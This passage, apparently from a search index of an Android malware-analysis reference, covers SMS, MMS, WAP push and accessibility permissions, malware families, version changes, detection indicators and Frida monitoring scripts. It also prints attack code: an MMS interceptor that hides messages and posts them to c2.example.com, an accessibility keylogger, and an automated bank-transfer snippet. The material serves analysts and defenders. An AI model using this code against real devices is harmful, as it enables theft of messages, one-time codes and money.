<code>BIND_NOTIFICATION_LISTENER_SERVICE</code> is easier to justify to the user (\"We need notification access for this feature\") and is not subject to Google Play's SMS policy. See Notification Listener Abuse.</p>"},{"location":"permissions/sms/read-sms/#android-version-changes","title":"Android Version Changes","text":""},{"location":"permissions/sms/read-sms/#android-44-api-19","title":"Android 4.4 (API 19)","text":"<p>Only the default SMS app can write to the SMS content provider. Non-default apps can still read all messages with <code>READ_SMS</code>. This was the first attempt to limit SMS abuse, but it only affected write operations.</p>"},{"location":"permissions/sms/read-sms/#android-60-api-23","title":"Android 6.0 (API 23)","text":"<p>Runtime permission required. Before this, <code>READ_SMS</code> was granted silently at install time. Under the original permission group model, granting <code>READ_SMS</code> also granted <code>RECEIVE_SMS</code>, <code>RECEIVE_MMS</code>, and <code>RECEIVE_WAP_PUSH</code> (all in the SMS group). This meant a single \"Allow\" tap gave malware the complete SMS interception toolkit.</p>"},{"location":"permissions/sms/read-sms/#android-80-api-26","title":"Android 8.0 (API 26)","text":"<p>Google Play policy begins restricting SMS permissions to apps with core SMS functionality. This predates the formal January 2019 enforcement but signals the direction. Apps must be declared as default SMS handler or have an approved use case.</p>"},{"location":"permissions/sms/read-sms/#android-10-api-29","title":"Android 10 (API 29)","text":"<p>Permission groups split to be more granular. <code>READ_SMS</code> no longer automatically grants access to Call Log or phone number data. Each permission in the SMS group must be individually justified, though granting one still prompts for the group on the runtime dialog.</p>"},{"location":"permissions/sms/read-sms/#android-13-api-33","title":"Android 13 (API 33)","text":"<p>Runtime permission model unchanged at the platform level, but Play Store review is significantly stricter about justifying SMS access. Photo picker and other scoped access APIs reduce legitimate reasons for broad permissions, making SMS permission requests more suspicious during review.</p>"},{"location":"permissions/sms/read-sms/#frida-monitoring-script","title":"Frida Monitoring Script","text":"<p>Monitor SMS content provider queries at runtime:</p> <pre><code>Java.perform(function () {\n    var ContentResolver = Java.use(\"android.content.ContentResolver\");\n\n    ContentResolver.query.overload(\n        \"android.net.Uri\",\n        \"[Ljava.lang.String;\",\n        \"java.lang.String\",\n        \"[Ljava.lang.String;\",\n        \"java.lang.String\"\n    ).implementation = function (uri, projection, selection, selectionArgs, sortOrder) {\n        var uriStr = uri.toString();\n        if (uriStr.indexOf(\"sms\") !== -1 || uriStr.indexOf(\"mms\") !== -1) {\n            console.log(\"[SMS Query] URI: \" + uriStr);\n            console.log(\"  projection: \" + projection);\n            console.log(\"  selection: \" + selection);\n            if (selectionArgs !== null) {\n                console.log(\"  selectionArgs: \" + selectionArgs);\n            }\n            console.log(\"  sortOrder: \" + sortOrder);\n            var trace = Java.use(\"android.util.Log\")\n                .getStackTraceString(Java.use(\"java.lang.Exception\").$new());\n            console.log(\"  caller: \" + trace);\n        }\n        return this.query(uri, projection, selection, selectionArgs, sortOrder);\n    };\n\n    var SmsManager = Java.use(\"android.telephony.SmsManager\");\n    SmsManager.sendTextMessage.overload(\n        \"java.lang.String\",\n        \"java.lang.String\",\n        \"java.lang.String\",\n        \"android.app.PendingIntent\",\n        \"android.app.PendingIntent\"\n    ).implementation = function (dest, sc, text, sentIntent, deliveryIntent) {\n        console.log(\"[SMS Send] to: \" + dest);\n        console.log(\"  body: \" + text);\n        this.sendTextMessage(dest, sc, text, sentIntent, deliveryIntent);\n    };\n});\n</code></pre>"},{"location":"permissions/sms/read-sms/#detection-indicators","title":"Detection Indicators","text":"<p>Manifest signals:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.READ_SMS\" /&gt;\n&lt;uses-permission android:name=\"android.permission.RECEIVE_SMS\" /&gt;\n</code></pre> <p>High-priority BroadcastReceiver registration (real-time interception):</p> <pre><code>&lt;receiver android:name=\".SmsReceiver\" android:exported=\"true\"&gt;\n    &lt;intent-filter android:priority=\"999\"&gt;\n        &lt;action android:name=\"android.provider.Telephony.SMS_RECEIVED\" /&gt;\n    &lt;/intent-filter&gt;\n&lt;/receiver&gt;\n</code></pre> <p>A <code>BroadcastReceiver</code> for <code>SMS_RECEIVED</code> with high priority (attempting to receive before the default SMS app) is a strong indicator of real-time SMS interception.</p> <p>High-confidence malware indicators (combination of):</p> <ul> <li><code>READ_SMS</code> + <code>RECEIVE_SMS</code> + <code>INTERNET</code> (SMS exfiltration)</li> <li><code>READ_SMS</code> + <code>RECEIVE_BOOT_COMPLETED</code> + <code>FOREGROUND_SERVICE</code> (persistent SMS monitoring)</li> <li><code>SEND_SMS</code> + <code>READ_CONTACTS</code> (SMS worm propagation, FluBot pattern)</li> <li><code>READ_SMS</code> + <code>RECEIVE_SMS</code> without being the default SMS app</li> <li>Content provider queries to <code>content://sms/</code> in background services</li> <li>String patterns matching OTP regex (<code>\\b\\d{4,8}\\b</code>, \"verification code\", \"confirmation code\")</li> </ul> <p>See also: SMS Interception | Notification Listener Abuse</p>"},{"location":"permissions/sms/receive-mms/","title":"RECEIVE_MMS","text":"<p>Allows receiving incoming MMS (Multimedia Messaging Service) messages. MMS carries images, audio, video, and rich text between devices.</p>"},{"location":"permissions/sms/receive-mms/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.RECEIVE_MMS</code> Protection Level <code>dangerous</code> Permission Group <code>SMS</code> Grant Method Runtime permission dialog Introduced API 1"},{"location":"permissions/sms/receive-mms/#what-it-enables","title":"What It Enables","text":"<p>Receive MMS messages containing multimedia content. The app can intercept and process incoming MMS before the default messaging app.</p>"},{"location":"permissions/sms/receive-mms/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/sms/receive-mms/#content-interception","title":"Content Interception","text":"<p>Intercept MMS messages containing photos, videos, or documents. Relevant for surveillance and data exfiltration.</p>"},{"location":"permissions/sms/receive-mms/#historical-stagefright","title":"Historical: Stagefright","text":"<p>The Stagefright vulnerability (CVE-2015-1538 and related) allowed remote code execution through specially crafted MP4 files delivered via MMS. The media framework processed the attached content automatically upon MMS receipt, before the user even opened the message. This was one of the most significant Android vulnerabilities discovered, affecting approximately 950 million devices.</p> <p>Google's response included monthly security patches (the Android Security Bulletin program started partly because of Stagefright) and changes to disable automatic MMS media processing.</p>"},{"location":"permissions/sms/receive-mms/#notable-families","title":"Notable Families","text":"Family Usage FinSpy Commercial surveillance suite that intercepts SMS and MMS for comprehensive message collection Pegasus NSO Group spyware that exfiltrates SMS, MMS, iMessage, and email content <p>FinSpy and Pegasus represent state-sponsored surveillance tools where MMS interception is part of comprehensive message collection rather than financial fraud. Both capture MMS content as part of their broader messaging surveillance modules. For financially-motivated malware, MMS interception has been largely superseded by SMS interception and notification listener techniques (see SMS Interception).</p>"},{"location":"permissions/sms/receive-mms/#banking-trojan-mms-interception","title":"Banking Trojan MMS Interception","text":"<p>Older banking trojan families used <code>RECEIVE_MMS</code> to intercept MMS-delivered authentication tokens and visual verification codes. Some financial institutions sent visual CAPTCHAs or QR codes via MMS as a second factor. Banking trojans intercepted these messages, extracted the image attachment, and forwarded it to the C2 server before the user could act on it.</p> <p>This technique has largely fallen out of use as banks moved to app-based push notifications and TOTP authenticators, but it remains relevant when analyzing legacy samples or targeting regions where MMS-based verification persists.</p>"},{"location":"permissions/sms/receive-mms/#abuse-code-example","title":"Abuse Code Example","text":"<pre><code>public class MmsInterceptor extends BroadcastReceiver {\n\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        if (!Telephony.Sms.Intents.WAP_PUSH_RECEIVED_ACTION.equals(intent.getAction())) {\n            return;\n        }\n\n        byte[] data = intent.getByteArrayExtra(\"data\");\n        String contentType = intent.getType();\n\n        if (contentType != null &amp;&amp; contentType.startsWith(\"application/vnd.wap.mms-message\")) {\n            processMmsData(context, data);\n        }\n\n        abortBroadcast();\n    }\n\n    private void processMmsData(Context context, byte[] pduData) {\n        GenericPdu pdu = new PduParser(pduData, true).parse();\n        if (pdu instanceof NotificationInd) {\n            Uri contentLocation = ((NotificationInd) pdu).getContentLocation();\n            downloadAndForward(context, new String(contentLocation.getTextString()));\n        }\n    }\n\n    private void downloadAndForward(Context context, String mmsUrl) {\n        try {\n            HttpURLConnection conn = (HttpURLConnection)\n                new URL(mmsUrl).openConnection();\n            conn.setRequestProperty(\"User-Agent\", \"Android-Mms/2.0\");\n            InputStream is = conn.getInputStream();\n            byte[] mmsContent = readStream(is);\n\n            HttpURLConnection c2 = (HttpURLConnection)\n                new URL(\"https://c2.example.com/mms\").openConnection();\n            c2.setRequestMethod(\"POST\");\n            c2.setDoOutput(true);\n            c2.getOutputStream().write(mmsContent);\n            c2.getResponseCode();\n            c2.disconnect();\n        } catch (Exception e) {\n        }\n    }\n\n    private byte[] readStream(InputStream is) throws Exception {\n        ByteArrayOutputStream buffer = new ByteArrayOutputStream();\n        byte[] chunk = new byte[4096];\n        int len;\n        while ((len = is.read(chunk)) != -1) {\n            buffer.write(chunk, 0, len);\n        }\n        return buffer.toByteArray();\n    }\n}\n</code></pre> <p>The receiver registers with high priority to intercept MMS notifications before the default messaging app. <code>abortBroadcast()</code> suppresses the notification so the user never sees the incoming MMS. The malware downloads the MMS content from the MMSC (Multimedia Messaging Service Center) and forwards it to the C2 server.</p>"},{"location":"permissions/sms/receive-mms/#android-version-changes","title":"Android Version Changes","text":"<p>Android 4.4 (API 19): only the default SMS app can write to the SMS/MMS content provider. Non-default apps can still receive MMS broadcasts.</p> <p>Android 6.0 (API 23): runtime permission required. <code>RECEIVE_MMS</code> falls under the <code>SMS</code> permission group, so granting any SMS permission could grant others in the same group.</p> <p>Android 8.0 (API 26): implicit broadcast restrictions introduced. Apps targeting API 26+ cannot register <code>BroadcastReceiver</code> for MMS in the manifest and must register dynamically or be the default SMS app. This significantly reduced MMS interception capability for sideloaded malware.</p> <p>January 2019: Google Play policy restricts SMS/MMS permissions to apps declared as default SMS handlers. Sideloaded malware can still use the permission but cannot distribute through Google Play with it.</p>"},{"location":"permissions/sms/receive-mms/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.RECEIVE_MMS\" /&gt;\n</code></pre> <p>Subject to the same Google Play SMS permission restrictions. Rarely requested by modern malware outside of stalkerware.</p>"},{"location":"permissions/sms/receive-mms/#analysis-indicators","title":"Analysis Indicators","text":"<ul> <li>Look for <code>BroadcastReceiver</code> registrations with <code>WAP_PUSH_RECEIVED_ACTION</code> intent filter and high priority values (999 or <code>Integer.MAX_VALUE</code>).</li> <li><code>abortBroadcast()</code> calls in MMS receivers indicate the app is suppressing MMS delivery to the user.</li> <li>MMS PDU parsing classes (<code>PduParser</code>, <code>GenericPdu</code>, <code>NotificationInd</code>) in an app that is not a messaging client are suspicious.</li> <li>Network requests to MMSC URLs (typically carrier-specific) followed by uploads to non-carrier endpoints indicate interception and exfiltration.</li> <li>Modern malware rarely uses <code>RECEIVE_MMS</code> alone -- it is almost always paired with <code>RECEIVE_SMS</code> and <code>READ_SMS</code> for comprehensive message interception.</li> </ul>"},{"location":"permissions/sms/receive-mms/#see-also","title":"See Also","text":"<ul> <li>SMS Interception -- broader attack technique covering all SMS/MMS interception methods and their evolution</li> <li>RECEIVE_SMS -- the more commonly abused SMS interception permission</li> <li>READ_SMS -- retroactive SMS reading, often paired with <code>RECEIVE_MMS</code></li> <li>Broadcast Theft -- the underlying broadcast interception technique used for MMS interception</li> <li>Notification Listener Abuse -- the modern replacement for SMS/MMS interception in most malware families</li> </ul>"},{"location":"permissions/sms/receive-sms/","title":"RECEIVE_SMS","text":"<p>Allows receiving incoming SMS messages in real-time via a broadcast receiver. More valuable to attackers than <code>READ_SMS</code> because it captures messages the moment they arrive, enabling OTP interception before the user reads the notification.</p>"},{"location":"permissions/sms/receive-sms/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.RECEIVE_SMS</code> Protection Level <code>dangerous</code> Permission Group <code>SMS</code> Grant Method Runtime permission dialog Introduced API 1"},{"location":"permissions/sms/receive-sms/#what-it-enables","title":"What It Enables","text":"<p>Register a <code>BroadcastReceiver</code> for <code>android.provider.Telephony.SMS_RECEIVED</code>:</p> <pre><code>public class SmsReceiver extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        Bundle bundle = intent.getExtras();\n        Object[] pdus = (Object[]) bundle.get(\"pdus\");\n        for (Object pdu : pdus) {\n            SmsMessage msg = SmsMessage.createFromPdu((byte[]) pdu);\n            String sender = msg.getOriginatingAddress();\n            String body = msg.getMessageBody();\n        }\n    }\n}\n</code></pre> <p>Manifest registration:</p> <pre><code>&lt;receiver android:name=\".SmsReceiver\" android:exported=\"true\"&gt;\n    &lt;intent-filter android:priority=\"999\"&gt;\n        &lt;action android:name=\"android.provider.Telephony.SMS_RECEIVED\" /&gt;\n    &lt;/intent-filter&gt;\n&lt;/receiver&gt;\n</code></pre> <p>The <code>android:priority=\"999\"</code> ensures the malware's receiver runs before the default SMS app.</p>"},{"location":"permissions/sms/receive-sms/#suppressing-messages","title":"Suppressing Messages","text":"<p>On Android &lt; 4.4, any app with <code>RECEIVE_SMS</code> could call <code>abortBroadcast()</code> to prevent the SMS from reaching other receivers, including the default SMS app. The user never sees the message.</p> <p>On Android 4.4+, only the default SMS app can abort. But the malware still reads the content and forwards it to C2. The user may see the message, but the OTP is already stolen.</p>"},{"location":"permissions/sms/receive-sms/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/sms/receive-sms/#real-time-otp-theft","title":"Real-Time OTP Theft","text":"<p>The primary use case. Malware intercepts banking OTPs within milliseconds:</p> <ol> <li>Attacker initiates a fraudulent transaction on the victim's banking account</li> <li>Bank sends OTP via SMS</li> <li>Malware intercepts the SMS before the user reads it</li> <li>Malware forwards OTP to C2</li> <li>Attacker completes the transaction</li> </ol>"},{"location":"permissions/sms/receive-sms/#sms-worm-propagation","title":"SMS Worm Propagation","text":"<p>FluBot used <code>RECEIVE_SMS</code> + <code>SEND_SMS</code> to create a self-spreading worm:</p> <ol> <li>Receive incoming SMS</li> <li>Extract the sender's number</li> <li>Send a phishing SMS to that number with a malicious link</li> <li>New victim installs the malware</li> <li>Repeat</li> </ol>"},{"location":"permissions/sms/receive-sms/#c2-via-sms","title":"C2 via SMS","text":"<p>Some malware uses SMS as a command-and-control channel. The C2 server sends commands via SMS, and the malware receives and executes them. This works even without internet connectivity and is harder to block with network-level security tools.</p>"},{"location":"permissions/sms/receive-sms/#android-version-changes","title":"Android Version Changes","text":"<p>Android 4.4 (API 19): only default SMS app can abort broadcasts or write to SMS provider.</p> <p>Android 8.0 (API 26): implicit broadcast restrictions. <code>SMS_RECEIVED</code> is exempt and still delivered to manifest-registered receivers.</p> <p>Android 10 (API 29): apps must declare specific foreground service types. Background SMS interception still works via manifest-registered receivers.</p>"},{"location":"permissions/sms/receive-sms/#notable-families","title":"Notable Families","text":"<p>Nearly every banking trojan uses <code>RECEIVE_SMS</code> for OTP interception. See Broadcast Theft for the full family list.</p> Family SMS Interception Usage Cerberus 2FA OTP interception, SMS forwarding to C2 Hook OTP interception during ATS fraud GodFather OTP theft across 400+ banking targets Anatsa OTP capture during automated transfers FluBot OTP theft + SMS worm propagation (sends phishing to contacts) TrickMo Originally built as TrickBot's 2FA bypass component SpyNote Full SMS surveillance (read, intercept, forward) Mamont Highest-volume banker in 2024, SMS + notification interception TsarBot OTP capture across 750+ targets"},{"location":"permissions/sms/receive-sms/#detection","title":"Detection","text":"<p>High-priority <code>SMS_RECEIVED</code> receiver in the manifest is the primary indicator. Combined with <code>INTERNET</code> and <code>SEND_SMS</code>, this is strong evidence of SMS-stealing or worm behavior.</p>"},{"location":"permissions/sms/receive-wap-push/","title":"RECEIVE_WAP_PUSH","text":"<p>Allows receiving WAP push messages, which are used to deliver MMS notifications and OMA (Open Mobile Alliance) provisioning messages. Historically abused for premium service subscription fraud and MMS-based exploits.</p>"},{"location":"permissions/sms/receive-wap-push/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.RECEIVE_WAP_PUSH</code> Protection Level <code>dangerous</code> Permission Group <code>SMS</code> Grant Method Runtime permission dialog Introduced API 1"},{"location":"permissions/sms/receive-wap-push/#what-it-enables","title":"What It Enables","text":"<p>Receive <code>WAP_PUSH_RECEIVED</code> broadcasts containing WAP Service Indication (SI) and Service Loading (SL) messages.</p> <p>WAP push messages can:</p> <ul> <li>Deliver MMS download URLs</li> <li>Trigger automatic URL loading (SL messages)</li> <li>Carry OMA provisioning data (network configuration)</li> </ul>"},{"location":"permissions/sms/receive-wap-push/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/sms/receive-wap-push/#wap-billing-fraud","title":"WAP Billing Fraud","text":"<p>Joker (Bread) malware family heavily abused WAP push:</p> <ol> <li>Malware subscribes user to premium WAP billing services</li> <li>WAP push confirmation messages arrive</li> <li>Malware intercepts and confirms them automatically</li> <li>User is charged on their phone bill</li> </ol> <p>This was one of the most persistent Play Store threats. Google removed 1700+ Joker-infected apps over its lifetime.</p>"},{"location":"permissions/sms/receive-wap-push/#mms-exploit-delivery","title":"MMS Exploit Delivery","text":"<p>Stagefright (2015) exploited the media processing pipeline through MMS messages. WAP push delivers the MMS notification, and the media framework automatically processes the attached content. While Stagefright itself was a framework vulnerability (not a permission issue), the WAP push reception path was part of the attack chain.</p>"},{"location":"permissions/sms/receive-wap-push/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.RECEIVE_WAP_PUSH\" /&gt;\n</code></pre> <p>Combined with <code>SEND_SMS</code> and <code>RECEIVE_SMS</code>, indicates potential WAP billing fraud. Subject to the same Google Play policy restrictions as other SMS permissions.</p>"},{"location":"permissions/sms/send-sms/","title":"SEND_SMS","text":"<p>Allows sending SMS messages programmatically without user interaction. Used for premium SMS fraud (sending messages to premium-rate numbers), phishing distribution (sending malicious links to victim's contacts), and covert C2 communication.</p>"},{"location":"permissions/sms/send-sms/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.SEND_SMS</code> Protection Level <code>dangerous</code> Permission Group <code>SMS</code> Grant Method Runtime permission dialog Introduced API 1"},{"location":"permissions/sms/send-sms/#what-it-enables","title":"What It Enables","text":"<pre><code>SmsManager smsManager = SmsManager.getDefault();\nsmsManager.sendTextMessage(\"+1234567890\", null, \"message body\", null, null);\n</code></pre> <p>The message is sent without any UI or confirmation dialog. The user may see it appear in their sent messages (depending on Android version and default SMS app behavior).</p> <p>For long messages:</p> <pre><code>ArrayList&lt;String&gt; parts = smsManager.divideMessage(longText);\nsmsManager.sendMultipartTextMessage(number, null, parts, null, null);\n</code></pre>"},{"location":"permissions/sms/send-sms/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/sms/send-sms/#premium-sms-fraud","title":"Premium SMS Fraud","text":"<p>Sending messages to premium-rate short codes that charge the victim's phone bill. Each message costs $1-10. Malware sends messages in the background and may delete sent message records to cover tracks.</p> <p>This was the dominant Android malware monetization method from 2010-2014 before banking trojans became more profitable.</p>"},{"location":"permissions/sms/send-sms/#smishing-sms-phishing","title":"Smishing (SMS Phishing)","text":"<p>Sending phishing messages from the victim's phone to their contacts:</p> <ol> <li>Malware reads contact list (via <code>READ_CONTACTS</code>)</li> <li>Sends SMS to each contact with a malicious link</li> <li>Recipients trust the message because it comes from a known number</li> <li>Recipients click the link and install the malware</li> </ol> <p>FluBot spread across Europe using this exact method, reaching millions of devices.</p>"},{"location":"permissions/sms/send-sms/#c2-channel","title":"C2 Channel","text":"<p>SMS as a backup command-and-control channel:</p> <ul> <li>Works without internet</li> <li>Not visible to network monitoring tools</li> <li>Messages can be deleted from the sent folder to hide evidence</li> <li>C2 server sends commands via SMS to victim's number</li> </ul>"},{"location":"permissions/sms/send-sms/#notable-families","title":"Notable Families","text":"Family SMS Usage FakePlayer First Android malware (2010). Premium SMS only. FluBot SMS worm. Sent phishing to all contacts. Dismantled by Europol 2022. Joker Premium subscription via SMS and WAP billing. Thousands of Play Store variants. Harly Invisible subscription fraud via hidden WebView and SMS confirmation. GriftHorse Premium SMS at scale. 10M+ victims. TrickMo SMS forwarding for 2FA bypass. MoqHao Smishing distribution to victim's contacts. Pan-Asian campaigns. Rafel RAT SMS C2 channel as backup. Ransomware unlock via SMS. Anubis SMS forwarding, premium SMS capability. SpyNote Full SMS send/read/intercept. Mass deployment. Mamont SMS forwarding for OTP exfiltration."},{"location":"permissions/sms/send-sms/#android-version-changes","title":"Android Version Changes","text":"<p>Android 4.4 (API 19): introduced default SMS app concept. Non-default apps can still send SMS but may not be able to write to the SMS content provider.</p> <p>Android 5.1 (API 22): premium SMS protections. System warns user before sending to premium numbers.</p> <p>Google Play 2019: restricted <code>SEND_SMS</code> to apps declared as default SMS handler or with approved use cases.</p>"},{"location":"permissions/sms/send-sms/#detection","title":"Detection","text":"<p><code>SEND_SMS</code> combined with <code>READ_CONTACTS</code> or <code>RECEIVE_SMS</code> suggests worm-like or phishing distribution behavior. Combined with <code>INTERNET</code>, suggests SMS data exfiltration or C2 relay.</p>"},{"location":"permissions/special/","title":"Special Permissions","text":"<p>Permissions outside the standard dangerous permission model that are heavily abused in malware. These require special user actions to grant (settings toggles, installer prompts) rather than runtime dialogs.</p>"},{"location":"permissions/special/#permissions","title":"Permissions","text":"Permission Abuse Potential Malware Usage SYSTEM_ALERT_WINDOW Draw over other apps, enabling overlay attacks, credential phishing, tapjacking Most banking trojans WRITE_SETTINGS Modify system settings, change default apps, disable security features Rare in modern malware REQUEST_INSTALL_PACKAGES Install APKs, sideload malware, dropper functionality Droppers, multi-stage families REQUEST_DELETE_PACKAGES Uninstall apps, remove security software Anti-AV behavior MANAGE_EXTERNAL_STORAGE Full filesystem access, bypass scoped storage restrictions Spyware, ransomware BIND_ACCESSIBILITY_SERVICE Full UI interaction: keylogging, auto-granting permissions, device takeover Nearly all modern families BIND_NOTIFICATION_LISTENER_SERVICE Read all notifications, intercept OTPs, exfiltrate messages Alien, Mamont, FireScam BIND_DEVICE_ADMIN Device administration: lock device, wipe data, enforce policies BRATA, Rafel RAT, BingoMod PACKAGE_USAGE_STATS App usage data, track user behavior, identify active apps for overlay timing Overlay-based families USE_FULL_SCREEN_INTENT Launch activities over lock screen, phishing on locked devices TrickMo, TsarBot"},{"location":"permissions/special/#granting-mechanism","title":"Granting Mechanism","text":"<p>Unlike dangerous permissions that show a simple dialog, special permissions require the user to navigate to Android Settings:</p> Permission How It's Granted How Malware Obtains It <code>SYSTEM_ALERT_WINDOW</code> Settings &gt; Apps &gt; Special access &gt; Display over other apps Social engineering prompt, or auto-granted for Play Store installs (pre-Android 10) <code>BIND_ACCESSIBILITY_SERVICE</code> Settings &gt; Accessibility &gt; [App Name] Persistent fake prompts claiming the app needs \"accessibility\" for security <code>BIND_DEVICE_ADMIN</code> Settings &gt; Security &gt; Device admin apps Often combined with ransomware lock to prevent removal <code>REQUEST_INSTALL_PACKAGES</code> Settings &gt; Apps &gt; Special access &gt; Install unknown apps Requested as part of \"update\" flow <code>BIND_NOTIFICATION_LISTENER_SERVICE</code> Settings &gt; Apps &gt; Special access &gt; Notification access Presented as needed for \"message security\" <p>On Android 13+, Restricted Settings blocks sideloaded apps from directly requesting accessibility and notification listener. Malware bypasses this through session-based installation or by convincing users to manually navigate through the extra confirmation step.</p>"},{"location":"permissions/special/bind-accessibility-service/","title":"BIND_ACCESSIBILITY_SERVICE","text":"<p>The single most powerful permission in Android malware. An accessibility service can observe and interact with every element on screen, read notifications, perform gestures, and type text into any field. Modern banking trojans treat this as the primary goal -- once granted, full device takeover is possible without any other permission.</p>"},{"location":"permissions/special/bind-accessibility-service/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.BIND_ACCESSIBILITY_SERVICE</code> Protection Level <code>signature</code> Grant Method Settings &gt; Accessibility &gt; toggle on Introduced API 16 (Android 4.1) MITRE ATT&amp;CK T1453 - Abuse Accessibility Features <p>The <code>signature</code> protection level means only the system can bind to an accessibility service. The app declares the service in its manifest; the user enables it manually through system settings. No runtime permission dialog appears. Android shows a full-screen warning explaining the access being granted, but malware relies on social engineering overlays to rush users past this screen.</p>"},{"location":"permissions/special/bind-accessibility-service/#what-it-enables","title":"What It Enables","text":"<p>An accessibility service receives <code>AccessibilityEvent</code> callbacks and can use <code>AccessibilityNodeInfo</code> to traverse and interact with the UI tree of any foreground app.</p>"},{"location":"permissions/special/bind-accessibility-service/#capabilities","title":"Capabilities","text":"Capability API Offensive Impact Read screen content <code>AccessibilityNodeInfo.getText()</code> Keylogging, credential theft Perform clicks <code>performAction(ACTION_CLICK)</code> Auto-grant permissions, confirm installs Perform gestures <code>GestureDescription</code> (API 24+) Swipe, scroll, interact with any UI Fill text fields <code>Bundle(ACTION_SET_TEXT)</code> Inject text into any input Read notifications <code>FLAG_RETRIEVE_INTERACTIVE_WINDOWS</code> OTP interception Capture screen <code>takeScreenshot()</code> (API 30+) Screenshot any app including FLAG_SECURE Control display <code>GLOBAL_ACTION_LOCK_SCREEN</code> (API 28+) Lock screen to hide activity Enumerate windows <code>getWindows()</code> Detect which app is in foreground Global actions <code>performGlobalAction()</code> Press Back, Home, Recents, open notifications"},{"location":"permissions/special/bind-accessibility-service/#effective-permission-escalation","title":"Effective Permission Escalation","text":"<p>With accessibility alone, malware can:</p> <ul> <li>Grant itself other permissions by navigating to Settings &gt; Apps and clicking \"Allow\"</li> <li>Install additional APKs by clicking through install dialogs</li> <li>Disable Play Protect by navigating to Play Store settings</li> <li>Prevent its own uninstall by detecting Settings navigation and pressing Back/Home</li> <li>Perform on-device fraud (ODF) by operating banking apps directly</li> <li>Read encrypted messages from WhatsApp, Telegram, and Signal by capturing content after decryption on screen, as demonstrated by Sturnus</li> <li>Bypass FLAG_SECURE protections by using <code>AccessibilityNodeInfo</code> to read the UI tree rather than taking screenshots</li> </ul>"},{"location":"permissions/special/bind-accessibility-service/#keylogging-via-accessibility","title":"Keylogging via Accessibility","text":"<pre><code>@Override\npublic void onAccessibilityEvent(AccessibilityEvent event) {\n    if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {\n        CharSequence text = event.getText().toString();\n        String pkg = event.getPackageName().toString();\n        sendToC2(pkg, text);\n    }\n}\n</code></pre>"},{"location":"permissions/special/bind-accessibility-service/#automated-transfer-system-ats-via-accessibility","title":"Automated Transfer System (ATS) via Accessibility","text":"<pre><code>AccessibilityNodeInfo amountField = findNodeByViewId(\"com.bank.app:id/amount\");\nBundle args = new Bundle();\nargs.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, \"5000\");\namountField.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);\n\nAccessibilityNodeInfo confirmBtn = findNodeByViewId(\"com.bank.app:id/confirm\");\nconfirmBtn.performAction(AccessibilityNodeInfo.ACTION_CLICK);\n</code></pre>"},{"location":"permissions/special/bind-accessibility-service/#abuse-in-malware","title":"Abuse in Malware","text":"<p>Nearly every modern Android banking trojan requires accessibility. The typical flow:</p> <ol> <li>App installed (sideloaded or via dropper on Play Store)</li> <li>Social engineering overlay prompts user to enable accessibility</li> <li>Once enabled, malware auto-grants itself remaining permissions</li> <li>Malware operates autonomously: overlay attacks, OTP interception, automated transactions</li> </ol>"},{"location":"permissions/special/bind-accessibility-service/#notable-families","title":"Notable Families","text":"Family Accessibility Usage Source Anatsa (TeaBot) Auto-grants permissions, performs ATS fraud ThreatFabric Cerberus / Alien Overlay injection, keylogging, OTP theft, anti-uninstall ThreatFabric Crocodilus Black screen overlay to hide actions, Google Authenticator scraping ThreatFabric Sturnus Reads encrypted messaging apps via UI tree, bypasses E2E encryption ThreatFabric Herodotus Human-like typing delays to evade fraud detection timing analysis ThreatFabric SharkBot ATS fraud via accessibility, auto-fills transfer details Cleafy Joker Auto-subscribes to premium services by clicking through WAP billing Google Xenomorph Overlay + accessibility for complete ATS chain ThreatFabric Hook VNC-like remote access built on accessibility events ThreatFabric TrickMo Fake lock screen overlay to steal device PIN/pattern Cleafy RatOn Three-stage loader with NFC relay (Ghost Tap) capability ThreatFabric Klopatra Hidden VNC for remote device control via accessibility Cleafy Medusa (TangleBot) Full RAT capabilities, screen streaming ThreatFabric"},{"location":"permissions/special/bind-accessibility-service/#android-version-changes","title":"Android Version Changes","text":"<p>Android 7 (API 24): <code>GestureDescription</code> API added, enabling gesture-based interaction beyond simple clicks. This expanded what accessibility malware could do from tap-only to full swipe/scroll/drag operations.</p> <p>Android 11 (API 30): Restricted which apps appear in accessibility settings for apps targeting API 30+. Apps must declare <code>isAccessibilityTool=\"true\"</code> in metadata or their service is hidden. Sideloaded apps targeting older APIs bypass this.</p> <p>Android 13 (API 33): Restricted settings introduced. Apps installed from outside recognized app stores cannot navigate users to accessibility settings. The system blocks the intent and shows a \"Restricted setting\" dialog. Bypassed by session-based installers (the SecuriDropper technique) or targeting API &lt; 33.</p> <p>Android 14 (API 34): Added <code>ACCESSIBILITY_DATA_PRIVATE_YES</code> attribute allowing apps like Google Authenticator to prevent non-accessibility-tools from reading 2FA codes via the UI tree.</p> <p>Android 15 (API 35): Enhanced Confirmation Mode replaces Restricted Settings. Instead of checking which installation API was used, ECM checks a system-level allowlist preloaded in the factory image at <code>/system/etc/sysconfig</code>. This closes the session-based installer bypass that malware exploited since Android 13.</p>"},{"location":"permissions/special/bind-accessibility-service/#frida-monitoring-script","title":"Frida Monitoring Script","text":"<pre><code>Java.perform(function() {\n    var AccessibilityService = Java.use(\"android.accessibilityservice.AccessibilityService\");\n\n    AccessibilityService.onAccessibilityEvent.implementation = function(event) {\n        var eventType = event.getEventType();\n        var pkg = event.getPackageName();\n        var text = event.getText();\n        console.log(\"[A11y] type=\" + eventType + \" pkg=\" + pkg + \" text=\" + text);\n        this.onAccessibilityEvent(event);\n    };\n\n    var AccessibilityNodeInfo = 